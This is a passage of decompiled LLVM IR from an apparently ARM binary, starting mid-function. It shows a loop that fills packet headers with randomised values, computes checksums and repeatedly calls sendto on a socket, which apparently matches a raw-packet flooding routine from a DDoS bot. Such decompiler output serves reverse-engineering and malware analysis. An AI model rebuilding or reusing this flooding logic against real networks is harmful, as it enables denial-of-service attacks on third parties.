  %v0_e21c = load i32, i32* %r3.global-to-local, align 4
  %v1_e21c = trunc i32 %v0_e21c to i8
  %v2_e21c = load i32, i32* %r4.global-to-local, align 4
  %v3_e21c = add i32 %v2_e21c, 46
  %v4_e21c = inttoptr i32 %v3_e21c to i8*
  store i8 %v1_e21c, i8* %v4_e21c, align 1
  %v0_e220 = load i32, i32* %r2.global-to-local, align 4
  %v1_e220 = trunc i32 %v0_e220 to i8
  %v2_e220 = load i32, i32* %r4.global-to-local, align 4
  %v3_e220 = add i32 %v2_e220, 45
  %v4_e220 = inttoptr i32 %v3_e220 to i8*
  store i8 %v1_e220, i8* %v4_e220, align 1
  %v0_e224 = load i32, i32* %r0.global-to-local, align 4
  %v1_e224 = trunc i32 %v0_e224 to i8
  %v2_e224 = load i32, i32* %r4.global-to-local, align 4
  %v3_e224 = add i32 %v2_e224, 44
  %v4_e224 = inttoptr i32 %v3_e224 to i8*
  store i8 %v1_e224, i8* %v4_e224, align 1
  %v0_e228 = call i32 @function_117dc()
  store i32 %v0_e228, i32* %r0.global-to-local, align 4
  %v2_e230 = load i32, i32* %r4.global-to-local, align 4
  %v3_e230 = add i32 %v2_e230, 56
  %v4_e230 = inttoptr i32 %v3_e230 to i8*
  store i8 1, i8* %v4_e230, align 1
  store i32 3, i32* %r2.global-to-local, align 4
  store i32 6, i32* %r3.global-to-local, align 4
  store i32 0, i32* %ip.global-to-local, align 4
  %v1_e240 = load i32, i32* %r4.global-to-local, align 4
  %v2_e240 = add i32 %v1_e240, 48
  %v3_e240 = inttoptr i32 %v2_e240 to i32*
  store i32 %v0_e228, i32* %v3_e240, align 4
  %v0_e244 = load i32, i32* %r2.global-to-local, align 4
  %v1_e244 = trunc i32 %v0_e244 to i8
  %v2_e244 = load i32, i32* %r4.global-to-local, align 4
  %v3_e244 = add i32 %v2_e244, 58
  %v4_e244 = inttoptr i32 %v3_e244 to i8*
  store i8 %v1_e244, i8* %v4_e244, align 1
  %v0_e248 = load i32, i32* %r3.global-to-local, align 4
  %v1_e248 = trunc i32 %v0_e248 to i8
  %v2_e248 = load i32, i32* %r4.global-to-local, align 4
  %v3_e248 = add i32 %v2_e248, 59
  %v4_e248 = inttoptr i32 %v3_e248 to i8*
  store i8 %v1_e248, i8* %v4_e248, align 1
  %v0_e24c = load i32, i32* %ip.global-to-local, align 4
  %v1_e24c = load i32, i32* %r4.global-to-local, align 4
  %v2_e24c = add i32 %v1_e24c, 52
  %v3_e24c = inttoptr i32 %v2_e24c to i32*
  store i32 %v0_e24c, i32* %v3_e24c, align 4
  %v0_e250 = load i32, i32* %r2.global-to-local, align 4
  %v1_e250 = trunc i32 %v0_e250 to i8
  %v2_e250 = load i32, i32* %r4.global-to-local, align 4
  %v3_e250 = add i32 %v2_e250, 57
  %v4_e250 = inttoptr i32 %v3_e250 to i8*
  store i8 %v1_e250, i8* %v4_e250, align 1
  %v3_e254 = load i32, i32* %stack_var_-40, align 4
  store i32 %v3_e254, i32* %r3.global-to-local, align 4
  %v1_e258 = add i32 %v3_e254, 1
  store i32 %v1_e258, i32* %r4.global-to-local, align 4
  %v0_e25c = load i32, i32* @sl, align 4
  %v9_e25c = icmp eq i32 %v0_e25c, %v1_e258
  store i1 %v9_e25c, i1* %cpsr_z.global-to-local, align 1
  store i32 %v1_e258, i32* %stack_var_-40, align 4
  %v8_e264 = icmp sgt i32 %v0_e25c, %v1_e258
  br i1 %v8_e264, label %dec_label_pc_e078, label %dec_label_pc_e268

dec_label_pc_e268:                                ; preds = %bb76, %dec_label_pc_df8c
  %v0_e268 = phi i32 [ %v0_dfb8, %dec_label_pc_df8c ], [ %v0_e25c, %bb76 ]
  %v2_e268 = icmp eq i32 %v0_e268, 0
  store i1 %v2_e268, i1* %cpsr_z.global-to-local, align 1
  store i32 0, i32* %r3.global-to-local, align 4
  %v3_e420 = icmp eq i32 %v3_dfa8, 65535
  %v2_e49c = icmp eq i32 %v1_dfb4, 0
  %v2_e2a4 = icmp eq i32 %v6_df40, -1
  %v7_e2a4 = icmp eq i32 %v6_df40, -1
  br label %dec_label_pc_e270.outer

dec_label_pc_e270.outer:                          ; preds = %dec_label_pc_e39c, %dec_label_pc_e268
  %v1_e270.ph.in = phi i32 [ %v0_e390, %dec_label_pc_e39c ], [ %v0_e268, %dec_label_pc_e268 ]
  %v0_e270.ph = phi i1 [ %v2_e39c, %dec_label_pc_e39c ], [ %v2_e268, %dec_label_pc_e268 ]
  %v1_e270.ph = icmp slt i32 %v1_e270.ph.in, 0
  %v4_e270 = or i1 %v1_e270.ph, %v0_e270.ph
  br label %dec_label_pc_e270

dec_label_pc_e270:                                ; preds = %dec_label_pc_e270.outer, %dec_label_pc_e270
  br i1 %v4_e270, label %dec_label_pc_e270, label %dec_label_pc_e274

dec_label_pc_e274:                                ; preds = %dec_label_pc_e270
  store i32 0, i32* %stack_var_-40, align 4
  store i32 0, i32* %r0.global-to-local, align 4
  store i32 0, i32* %r7.global-to-local, align 4
  br label %dec_label_pc_e280

dec_label_pc_e280:                                ; preds = %dec_label_pc_e2fc, %dec_label_pc_e274
  %v1_e290 = phi i32 [ %v1_e38c, %dec_label_pc_e2fc ], [ 0, %dec_label_pc_e274 ]
  %v5_e284 = mul i32 %v1_e290, 24
  %v1_e288 = load i32, i32* @r8, align 4
  %v2_e288 = add i32 %v1_e288, %v5_e284
  store i32 %v2_e288, i32* %r3.global-to-local, align 4
  %v1_e28c = add i32 %v2_e288, 20
  %v2_e28c = inttoptr i32 %v1_e28c to i8*
  %v3_e28c = load i8, i8* %v2_e28c, align 1
  %v4_e28c = zext i8 %v3_e28c to i32
  store i32 %v4_e28c, i32* %r2.global-to-local, align 4
  %v0_e290 = load i32, i32* %fp.global-to-local, align 4
  %v4_e290 = mul i32 %v1_e290, 4
  %v5_e290 = add i32 %v0_e290, %v4_e290
  %v6_e290 = inttoptr i32 %v5_e290 to i32*
  %v7_e290 = load i32, i32* %v6_e290, align 4
  store i32 %v7_e290, i32* @r5, align 4
  %v7_e294 = icmp eq i8 %v3_e28c, 31
  store i1 %v7_e294, i1* %cpsr_z.global-to-local, align 1
  %v1_e298 = add i32 %v7_e290, 20
  store i32 %v1_e298, i32* @r6, align 4
  %tmp85 = icmp ult i8 %v3_e28c, 32
  br i1 %tmp85, label %dec_label_pc_e3a8, label %dec_label_pc_e2a0

dec_label_pc_e2a0:                                ; preds = %dec_label_pc_e280
  store i32 %v6_df40, i32* %r0.global-to-local, align 4
  store i1 %v7_e2a4, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_e2a4, label %dec_label_pc_e410, label %dec_label_pc_e2ac

dec_label_pc_e2ac:                                ; preds = %dec_label_pc_e3a8, %dec_label_pc_e2a0
  store i32 %v3_dfa8, i32* %r2.global-to-local, align 4
  store i32 65535, i32* @r4, align 4
  store i1 %v3_e420, i1* %cpsr_z.global-to-local, align 1
  br i1 %v3_e420, label %dec_label_pc_e42c, label %dec_label_pc_e2c0

dec_label_pc_e2c0:                                ; preds = %dec_label_pc_e410.dec_label_pc_e2c0_crit_edge, %dec_label_pc_e2ac
  %v1_e2c4 = phi i32 [ %v1_e2c4.pre, %dec_label_pc_e410.dec_label_pc_e2c0_crit_edge ], [ 65535, %dec_label_pc_e2ac ]
  store i32 %v3_dfac, i32* %r3.global-to-local, align 4
  %v9_e2c4 = icmp eq i32 %v3_dfac, %v1_e2c4
  store i1 %v9_e2c4, i1* %cpsr_z.global-to-local, align 1
  br i1 %v9_e2c4, label %dec_label_pc_e448, label %dec_label_pc_e2cc

dec_label_pc_e2cc:                                ; preds = %dec_label_pc_e42c.dec_label_pc_e2cc_crit_edge, %dec_label_pc_e2c0
  %v1_e2d0 = phi i32 [ %v1_e2d0.pre, %dec_label_pc_e42c.dec_label_pc_e2cc_crit_edge ], [ %v1_e2c4, %dec_label_pc_e2c0 ]
  store i32 %v3_dfb0, i32* %ip.global-to-local, align 4
  %v9_e2d0 = icmp eq i32 %v3_dfb0, %v1_e2d0
  store i1 %v9_e2d0, i1* %cpsr_z.global-to-local, align 1
  br i1 %v9_e2d0, label %dec_label_pc_e464, label %dec_label_pc_e2d8

dec_label_pc_e2d8:                                ; preds = %dec_label_pc_e448.dec_label_pc_e2d8_crit_edge, %dec_label_pc_e2cc
  %v1_e2dc = phi i32 [ %v1_e2dc.pre, %dec_label_pc_e448.dec_label_pc_e2d8_crit_edge ], [ %v1_e2d0, %dec_label_pc_e2cc ]
  store i32 %v5_de7c, i32* %r0.global-to-local, align 4
  %v9_e2dc = icmp eq i32 %v5_de7c, %v1_e2dc
  store i1 %v9_e2dc, i1* %cpsr_z.global-to-local, align 1
  br i1 %v9_e2dc, label %dec_label_pc_e480, label %dec_label_pc_e2e4

dec_label_pc_e2e4:                                ; preds = %dec_label_pc_e464.dec_label_pc_e2e4_crit_edge, %dec_label_pc_e2d8
  %v1_e2e8 = phi i32 [ %v1_e2e8.pre, %dec_label_pc_e464.dec_label_pc_e2e4_crit_edge ], [ %v1_e2dc, %dec_label_pc_e2d8 ]
  store i32 %v6_de94, i32* %r2.global-to-local, align 4
  %v9_e2e8 = icmp eq i32 %v6_de94, %v1_e2e8
  store i1 %v9_e2e8, i1* %cpsr_z.global-to-local, align 1
  br i1 %v9_e2e8, label %dec_label_pc_e494, label %dec_label_pc_e2f0

dec_label_pc_e2f0:                                ; preds = %dec_label_pc_e480, %dec_label_pc_e2e4
  store i32 %v1_dfb4, i32* %r3.global-to-local, align 4
  store i1 %v2_e49c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_e49c, label %dec_label_pc_e2fc, label %dec_label_pc_e4a8

dec_label_pc_e2fc:                                ; preds = %dec_label_pc_e2f0, %dec_label_pc_e494, %dec_label_pc_e4a8
  store i32 20, i32* %r1.global-to-local, align 4
  %v0_e300 = load i32, i32* %r7.global-to-local, align 4
  %v1_e300 = trunc i32 %v0_e300 to i8
  %v2_e300 = load i32, i32* @r5, align 4
  %v3_e300 = add i32 %v2_e300, 10
  %v4_e300 = inttoptr i32 %v3_e300 to i8*
  store i8 %v1_e300, i8* %v4_e300, align 1
  %v0_e304 = load i32, i32* %r7.global-to-local, align 4
  %v1_e304 = trunc i32 %v0_e304 to i8
  %v2_e304 = load i32, i32* @r5, align 4
  %v3_e304 = add i32 %v2_e304, 11
  %v4_e304 = inttoptr i32 %v3_e304 to i8*
  store i8 %v1_e304, i8* %v4_e304, align 1
  %v0_e308 = load i32, i32* @r5, align 4
  store i32 %v0_e308, i32* @r0, align 4
  %v2_e30c = call i32 @function_fda0(i32 %v0_e308, i32 20)
  %v3_e30c = trunc i32 %v2_e30c to i8
  %v4_e31027 = udiv i32 %v2_e30c, 256
  %v1_e314 = trunc i32 %v4_e31027 to i8
  %v2_e314 = load i32, i32* @r5, align 4
  %v3_e314 = add i32 %v2_e314, 11
  %v4_e314 = inttoptr i32 %v3_e314 to i8*
  store i8 %v1_e314, i8* %v4_e314, align 1
  %v3_e318 = load i32, i32* @r5, align 4
  %v4_e318 = add i32 %v3_e318, 10
  %v5_e318 = inttoptr i32 %v4_e318 to i8*
  store i8 %v3_e30c, i8* %v5_e318, align 1
  %v0_e31c = load i32, i32* @r6, align 4
  store i32 %v0_e31c, i32* @r1, align 4
  store i32 10240, i32* %r2.global-to-local, align 4
  store i32 40, i32* %r3.global-to-local, align 4
  %v0_e328 = load i32, i32* %r7.global-to-local, align 4
  %v1_e328 = trunc i32 %v0_e328 to i8
  %v3_e328 = add i32 %v0_e31c, 16
  %v4_e328 = inttoptr i32 %v3_e328 to i8*
  store i8 %v1_e328, i8* %v4_e328, align 1
  %v0_e32c = load i32, i32* %r7.global-to-local, align 4
  %v1_e32c = trunc i32 %v0_e32c to i8
  %v2_e32c = load i32, i32* @r6, align 4
  %v3_e32c = add i32 %v2_e32c, 17
  %v4_e32c = inttoptr i32 %v3_e32c to i8*
  store i8 %v1_e32c, i8* %v4_e32c, align 1
  %v0_e330 = load i32, i32* @r5, align 4
  store i32 %v0_e330, i32* %r0.global-to-local, align 4
  %v4_e334 = call i32 @function_fdfc(i32 %v0_e330, i32 %v0_e31c, i32 10240, i32 40)
  %v5_e334 = trunc i32 %v4_e334 to i8
  store i32 %v4_e334, i32* %r0.global-to-local, align 4
  %v4_e33828 = udiv i32 %v4_e334, 256
  %v1_e33c = trunc i32 %v4_e33828 to i8
  %v2_e33c = load i32, i32* @r6, align 4
  %v3_e33c = add i32 %v2_e33c, 17
  %v4_e33c = inttoptr i32 %v3_e33c to i8*
  store i8 %v1_e33c, i8* %v4_e33c, align 1
  %v3_e340 = load i32, i32* @r6, align 4
  %v4_e340 = add i32 %v3_e340, 16
  %v5_e340 = inttoptr i32 %v4_e340 to i8*
  store i8 %v5_e334, i8* %v5_e340, align 1
  %v3_e344 = load i32, i32* %stack_var_-40, align 4
  store i32 %v3_e344, i32* %r3.global-to-local, align 4
  %v0_e348 = load i32, i32* @r5, align 4
  %v1_e348 = add i32 %v0_e348, 20
  %v2_e348 = inttoptr i32 %v1_e348 to i32*
  %v3_e348 = load i32, i32* %v2_e348, align 4
  %v3_e350 = udiv i32 %v3_e348, 65536
  store i32 %v3_e350, i32* %r2.global-to-local, align 4
  %v5_e354 = mul i32 %v3_e344, 24
  %v1_e358 = load i32, i32* @r8, align 4
  %v2_e358 = add i32 %v1_e358, %v5_e354
  store i32 %v2_e358, i32* %ip.global-to-local, align 4
  %v3_e35c26 = udiv i32 %v3_e348, 16777216
  %v1_e360 = trunc i32 %v3_e35c26 to i8
  %v3_e360 = add i32 %v2_e358, 3
  %v4_e360 = inttoptr i32 %v3_e360 to i8*
  store i8 %v1_e360, i8* %v4_e360, align 1
  %v0_e364 = load i32, i32* %r2.global-to-local, align 4
  %v1_e364 = trunc i32 %v0_e364 to i8
  %v2_e364 = load i32, i32* %ip.global-to-local, align 4
  %v3_e364 = add i32 %v2_e364, 2
  %v4_e364 = inttoptr i32 %v3_e364 to i8*
  store i8 %v1_e364, i8* %v4_e364, align 1
  store i32 16384, i32* %r3.global-to-local, align 4
  %v0_e36c = load i32, i32* @r5, align 4
  store i32 %v0_e36c, i32* %r1.global-to-local, align 4
  %v0_e370 = load i32, i32* %sb.global-to-local, align 4
  store i32 %v0_e370, i32* %r0.global-to-local, align 4
  store i32 60, i32* %r2.global-to-local, align 4
  store i32 16, i32* %r4.global-to-local, align 4
  %v0_e37c = load i32, i32* %ip.global-to-local, align 4
  %v6_e384 = call i32 @_sendto(i32 %v0_e370, i32 %v0_e36c, i32 60, i32 16384, i32 %v0_e37c, i32 16)
  %v3_e388 = load i32, i32* %stack_var_-40, align 4
  store i32 %v3_e388, i32* %r3.global-to-local, align 4
  %v1_e38c = add i32 %v3_e388, 1
  store i32 %v1_e38c, i32* %r0.global-to-local, align 4
  %v0_e390 = load i32, i32* @sl, align 4
  %v9_e390 = icmp eq i32 %v0_e390, %v1_e38c
  store i1 %v9_e390, i1* %cpsr_z.global-to-local, align 1
  store i32 %v1_e38c, i32* %stack_var_-40, align 4
  %v8_e398 = icmp sgt i32 %v0_e390, %v1_e38c
  br i1 %v8_e398, label %dec_label_pc_e280, label %dec_label_pc_e39c

dec_label_pc_e39c:                                ; preds = %dec_label_pc_e2fc
  %v2_e39c = icmp eq i32 %v0_e390, 0
  store i1 %v2_e39c, i1* %cpsr_z.global-to-local, align 1
  store i32 0, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_e270.outer

dec_label_pc_e3a8:                                ; preds = %dec_label_pc_e280
  %v1_e3a8 = add i32 %v2_e288, 16
  %v2_e3a8 = inttoptr i32 %v1_e3a8 to i32*
  %v3_e3a8 = load i32, i32* %v2_e3a8, align 4
  store i32 %v3_e3a8, i32* %r4.global-to-local, align 4
  %v0_e3ac = call i32 @function_117dc()
  store i32 %v0_e3ac, i32* %r0.global-to-local, align 4
  %v3_e3b0 = load i32, i32* %stack_var_-40, align 4
  %v5_e3b8 = mul i32 %v3_e3b0, 24
  %v0_e3bc = load i32, i32* %r4.global-to-local, align 4
  %v1_e3c0 = load i32, i32* @r8, align 4
  %v2_e3c0 = add i32 %v1_e3c0, %v5_e3b8
  store i32 %v2_e3c0, i32* %r1.global-to-local, align 4
  %v1_e3c4 = and i32 %v0_e3bc, 65280
  store i32 %v1_e3c4, i32* %r3.global-to-local, align 4
  %v1_e3bc = udiv i32 %v0_e3bc, 256
  %v3_e3c8 = and i32 %v1_e3bc, 65280
  store i32 %v3_e3c8, i32* %r2.global-to-local, align 4
  %v3_e3cc = mul i32 %v0_e3bc, 16777216
  store i32 %v3_e3cc, i32* %ip.global-to-local, align 4
  %v1_e3d0 = add i32 %v2_e3c0, 20
  %v2_e3d0 = inttoptr i32 %v1_e3d0 to i8*
  %v3_e3d0 = load i8, i8* %v2_e3d0, align 1
  %v4_e3d0 = zext i8 %v3_e3d0 to i32
  %v4_e3d4 = mul nuw nsw i32 %v1_e3c4, 256
  %v5_e3d4 = or i32 %v4_e3d4, %v3_e3cc
  store i32 %v5_e3d4, i32* %ip.global-to-local, align 4
  %v2_e3dc = call i32 @llvm.bswap.i32(i32 %v0_e3bc)
  %v7_e3e0 = lshr i32 %v0_e3ac, %v4_e3d0
  %v8_e3e0 = add i32 %v7_e3e0, %v2_e3dc
  store i32 %v8_e3e0, i32* %r2.global-to-local, align 4
  %v3_e3ec = mul i32 %v8_e3e0, 16777216
  %v1_e3e4 = mul i32 %v8_e3e0, 256
  %v4_e3f0 = and i32 %v1_e3e4, 16711680
  %v5_e3f0 = or i32 %v4_e3f0, %v3_e3ec
  store i32 %v5_e3f0, i32* %r1.global-to-local, align 4
  store i32 %v6_df40, i32* %r0.global-to-local, align 4
  %v2_e400 = call i32 @llvm.bswap.i32(i32 %v8_e3e0)
  store i32 %v2_e400, i32* %r3.global-to-local, align 4
  store i1 %v7_e2a4, i1* %cpsr_z.global-to-local, align 1
  %v1_e408 = load i32, i32* @r5, align 4
  %v2_e408 = add i32 %v1_e408, 16
  %v3_e408 = inttoptr i32 %v2_e408 to i32*
  store i32 %v2_e400, i32* %v3_e408, align 4
  br i1 %v2_e2a4, label %dec_label_pc_e410, label %dec_label_pc_e2ac

dec_label_pc_e410:                                ; preds = %dec_label_pc_e3a8, %dec_label_pc_e2a0
  %v0_e410 = call i32 @function_117dc()
  store i32 %v0_e410, i32* %r0.global-to-local, align 4
  store i32 %v3_dfa8, i32* %r2.global-to-local, align 4
  store i32 65535, i32* @r4, align 4
  store i1 %v3_e420, i1* %cpsr_z.global-to-local, align 1
  %v1_e424 = load i32, i32* @r5, align 4
  %v2_e424 = add i32 %v1_e424, 12
  %v3_e424 = inttoptr i32 %v2_e424 to i32*
  store i32 %v0_e410, i32* %v3_e424, align 4
  br i1 %v3_e420, label %dec_label_pc_e42c, label %dec_label_pc_e410.dec_label_pc_e2c0_crit_edge

dec_label_pc_e410.dec_label_pc_e2c0_crit_edge:    ; preds = %dec_label_pc_e410
  %v1_e2c4.pre = load i32, i32* @r4, align 4
  br label %dec_label_pc_e2c0

dec_label_pc_e42c:                                ; preds = %dec_label_pc_e410, %dec_label_pc_e2ac
  %v0_e42c = call i32 @function_117dc()
  %v1_e42c = trunc i32 %v0_e42c to i8
  store i32 %v0_e42c, i32* %r0.global-to-local, align 4
  %v4_e43029 = udiv i32 %v0_e42c, 256
  %v1_e434 = trunc i32 %v4_e43029 to i8
  %v2_e434 = load i32, i32* @r5, align 4
  %v3_e434 = add i32 %v2_e434, 5
  %v4_e434 = inttoptr i32 %v3_e434 to i8*
  store i8 %v1_e434, i8* %v4_e434, align 1
  store i32 %v3_dfac, i32* %r3.global-to-local, align 4
  %v1_e43c = load i32, i32* @r4, align 4
  %v9_e43c = icmp eq i32 %v3_dfac, %v1_e43c
  store i1 %v9_e43c, i1* %cpsr_z.global-to-local, align 1
  %v3_e440 = load i32, i32* @r5, align 4
  %v4_e440 = add i32 %v3_e440, 4
  %v5_e440 = inttoptr i32 %v4_e440 to i8*
  store i8 %v1_e42c, i8* %v5_e440, align 1
  %v0_e444 = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_e444, label %dec_label_pc_e448, label %dec_label_pc_e42c.dec_label_pc_e2cc_crit_edge

dec_label_pc_e42c.dec_label_pc_e2cc_crit_edge:    ; preds = %dec_label_pc_e42c
  %v1_e2d0.pre = load i32, i32* @r4, align 4
  br label %dec_label_pc_e2cc

dec_label_pc_e448:                                ; preds = %dec_label_pc_e42c, %dec_label_pc_e2c0
  %v0_e448 = call i32 @function_117dc()
  %v1_e448 = trunc i32 %v0_e448 to i8
  store i32 %v0_e448, i32* %r0.global-to-local, align 4
  store i32 %v3_dfb0, i32* %ip.global-to-local, align 4
  %v4_e450 = sdiv i32 %v0_e448, 256
  store i32 %v4_e450, i32* %r3.global-to-local, align 4
  %v1_e454 = load i32, i32* @r4, align 4
  %v9_e454 = icmp eq i32 %v3_dfb0, %v1_e454
  store i1 %v9_e454, i1* %cpsr_z.global-to-local, align 1
  %v3_e458 = load i32, i32* @r5, align 4
  %v4_e458 = add i32 %v3_e458, 20
  %v5_e458 = inttoptr i32 %v4_e458 to i8*
  store i8 %v1_e448, i8* %v5_e458, align 1
  %v0_e45c = load i32, i32* %r3.global-to-local, align 4
  %v1_e45c = trunc i32 %v0_e45c to i8
  %v2_e45c = load i32, i32* @r6, align 4
  %v3_e45c = add i32 %v2_e45c, 1
  %v4_e45c = inttoptr i32 %v3_e45c to i8*
  store i8 %v1_e45c, i8* %v4_e45c, align 1
  %v0_e460 = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_e460, label %dec_label_pc_e464, label %dec_label_pc_e448.dec_label_pc_e2d8_crit_edge

dec_label_pc_e448.dec_label_pc_e2d8_crit_edge:    ; preds = %dec_label_pc_e448
  %v1_e2dc.pre = load i32, i32* @r4, align 4
  br label %dec_label_pc_e2d8

dec_label_pc_e464:                                ; preds = %dec_label_pc_e448, %dec_label_pc_e2cc
  %v0_e464 = call i32 @function_117dc()
  %v1_e464 = trunc i32 %v0_e464 to i8
  %v4_e468 = sdiv i32 %v0_e464, 256
  store i32 %v4_e468, i32* %r3.global-to-local, align 4
  %v3_e46c = load i32, i32* @r6, align 4
  %v4_e46c = add i32 %v3_e46c, 2
  %v5_e46c = inttoptr i32 %v4_e46c to i8*
  store i8 %v1_e464, i8* %v5_e46c, align 1
  store i32 %v5_de7c, i32* %r0.global-to-local, align 4
  %v1_e474 = load i32, i32* @r4, align 4
  %v9_e474 = icmp eq i32 %v5_de7c, %v1_e474
  store i1 %v9_e474, i1* %cpsr_z.global-to-local, align 1
  %v0_e478 = load i32, i32* %r3.global-to-local, align 4
  %v1_e478 = trunc i32 %v0_e478 to i8
  %v2_e478 = load i32, i32* @r6, align 4
  %v3_e478 = add i32 %v2_e478, 3
  %v4_e478 = inttoptr i32 %v3_e478 to i8*
  store i8 %v1_e478, i8* %v4_e478, align 1
  %v0_e47c = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_e47c, label %dec_label_pc_e480, label %dec_label_pc_e464.dec_label_pc_e2e4_crit_edge

dec_label_pc_e464.dec_label_pc_e2e4_crit_edge:    ; preds = %dec_label_pc_e464
  %v1_e2e8.pre = load i32, i32* @r4, align 4
  br label %dec_label_pc_e2e4

dec_label_pc_e480:                                ; preds = %dec_label_pc_e464, %dec_label_pc_e2d8
  %v0_e480 = call i32 @function_117dc()
  store i32 %v0_e480, i32* %r0.global-to-local, align 4
  store i32 %v6_de94, i32* %r2.global-to-local, align 4
  %v1_e488 = load i32, i32* @r4, align 4
  %v9_e488 = icmp eq i32 %v6_de94, %v1_e488
  store i1 %v9_e488, i1* %cpsr_z.global-to-local, align 1
  %v1_e48c = load i32, i32* @r6, align 4
  %v2_e48c = add i32 %v1_e48c, 4
  %v3_e48c = inttoptr i32 %v2_e48c to i32*
  store i32 %v0_e480, i32* %v3_e48c, align 4
  br i1 %v9_e488, label %dec_label_pc_e494, label %dec_label_pc_e2f0

dec_label_pc_e494:                                ; preds = %dec_label_pc_e480, %dec_label_pc_e2e4
  %v0_e494 = call i32 @function_117dc()
  store i32 %v0_e494, i32* %r0.global-to-local, align 4
  store i32 %v1_dfb4, i32* %r3.global-to-local, align 4
  store i1 %v2_e49c, i1* %cpsr_z.global-to-local, align 1
  %v1_e4a0 = load i32, i32* @r6, align 4
  %v2_e4a0 = add i32 %v1_e4a0, 8
  %v3_e4a0 = inttoptr i32 %v2_e4a0 to i32*
  store i32 %v0_e494, i32* %v3_e4a0, align 4
  br i1 %v2_e49c, label %dec_label_pc_e2fc, label %dec_label_pc_e4a8

dec_label_pc_e4a8:                                ; preds = %dec_label_pc_e2f0, %dec_label_pc_e494
  %v0_e4a8 = call i32 @function_117dc()
  %v1_e4a8 = trunc i32 %v0_e4a8 to i8
  store i32 %v0_e4a8, i32* %r0.global-to-local, align 4
  %v4_e4ac = sdiv i32 %v0_e4a8, 256
  store i32 %v4_e4ac, i32* %r3.global-to-local, align 4
  %v1_e4b0 = trunc i32 %v4_e4ac to i8
  %v2_e4b0 = load i32, i32* @r6, align 4
  %v3_e4b0 = add i32 %v2_e4b0, 19
  %v4_e4b0 = inttoptr i32 %v3_e4b0 to i8*
  store i8 %v1_e4b0, i8* %v4_e4b0, align 1
  %v3_e4b4 = load i32, i32* @r6, align 4
  %v4_e4b4 = add i32 %v3_e4b4, 18
  %v5_e4b4 = inttoptr i32 %v4_e4b4 to i8*
  store i8 %v1_e4a8, i8* %v5_e4b4, align 1
  br label %dec_label_pc_e2fc

dec_label_pc_e4bc:                                ; preds = %dec_label_pc_df64
  %v0_e4bc = load i32, i32* %sb.global-to-local, align 4
  store i32 %v0_e4bc, i32* %r0.global-to-local, align 4
  %v1_e4c0 = call i32 @_close(i32 %v0_e4bc)
  store i32 %v1_e4c0, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_e4c4

dec_label_pc_e4c4:                                ; preds = %dec_label_pc_dd8c, %dec_label_pc_e4bc
  %v29_e4c8 = phi i32 [ %v3_df54, %dec_label_pc_dd8c ], [ %v1_e4c0, %dec_label_pc_e4bc ]
  store i32 %v3_dd8c, i32* %r4.global-to-local, align 4
  store i32 %v6_dd8c, i32* %r5.global-to-local, align 4
  store i32 %v9_dd8c, i32* %r6.global-to-local, align 4
  store i32 %v12_dd8c, i32* %r7.global-to-local, align 4
  ret i32 %v29_e4c8

; uselistorder directives
  uselistorder i32 %v4_e4ac, { 1, 0 }
  uselistorder i32 %v0_e4a8, { 0, 2, 1 }
  uselistorder i32 %v0_e448, { 0, 2, 1 }
  uselistorder i32 %v0_e42c, { 0, 2, 1 }
  uselistorder i32 %v2_e400, { 1, 0 }
  uselistorder i32 %v8_e3e0, { 2, 0, 1, 3 }
  uselistorder i32 %v3_e3cc, { 1, 0 }
  uselistorder i32 %v0_e3bc, { 2, 0, 1, 3 }
  uselistorder i1 %v2_e39c, { 1, 0 }
  uselistorder i32 %v0_e390, { 1, 2, 3, 0 }
  uselistorder i32 %v1_e38c, { 2, 0, 3, 4, 1 }
  uselistorder i32 %v4_e334, { 0, 2, 1 }
  uselistorder i32 %v0_e31c, { 1, 0, 2 }
  uselistorder i1 %v7_e2a4, { 2, 1, 0 }
  uselistorder i1 %v2_e49c, { 2, 3, 1, 0 }
  uselistorder i1 %v3_e420, { 1, 0, 2, 3 }
  uselistorder i32 %v1_e258, { 1, 0, 2, 3 }
  uselistorder i8 %v5_e070, { 1, 0 }
  uselistorder i32 %v1_e050, { 1, 0 }
  uselistorder i32 %v1_e040, { 1, 0 }
  uselistorder i32 %v1_e03c, { 1, 0 }
  uselistorder i32 %v1_e038, { 1, 0 }
  uselistorder i32 %v3_e028, { 1, 0 }
  uselistorder i32 %v1_e018, { 1, 0 }
  uselistorder i32 %v1_e010, { 1, 0 }
  uselistorder i32 %v1_dfec, { 1, 0 }
  uselistorder i32 %v1_dfe0, { 1, 0 }
  uselistorder i32 %v1_dfb4, { 2, 1, 3, 0 }
  uselistorder i32 %v3_dfa8, { 0, 1, 3, 2 }
  uselistorder i32 %v0_dfa4, { 4, 0, 1, 3, 2 }
  uselistorder i32 %v0_dfa0, { 0, 1, 2, 4, 3 }
  uselistorder i1 %v7_df84, { 1, 0 }
  uselistorder i1 %v7_df58, { 1, 0 }
  uselistorder i32 %v3_df54, { 1, 2, 3, 0, 4 }
  uselistorder i32 %v6_df40, { 6, 4, 0, 5, 1, 3, 2 }
  uselistorder i32 %v6_de94, { 3, 2, 1, 0 }
  uselistorder i32 %v5_de7c, { 5, 4, 3, 2, 1, 0 }
  uselistorder i32 %v1_de2c, { 1, 0 }
  uselistorder i32 %v5_ddc4, { 1, 0 }
  uselistorder i32 %v1_dd90, { 2, 1, 0 }
  uselistorder i32* %stack_var_-40, { 0, 1, 2, 3, 4, 5, 6, 7, 8, 9, 11, 10 }
  uselistorder i32* %r4.global-to-local, { 0, 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 31, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 32, 33, 34, 35 }
  uselistorder i32* %r3.global-to-local, { 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31, 32, 33, 34, 35, 36, 37, 38, 39, 40, 41, 42, 43, 44, 45, 46, 47, 48, 49, 50, 51, 52, 53, 54, 55, 0 }
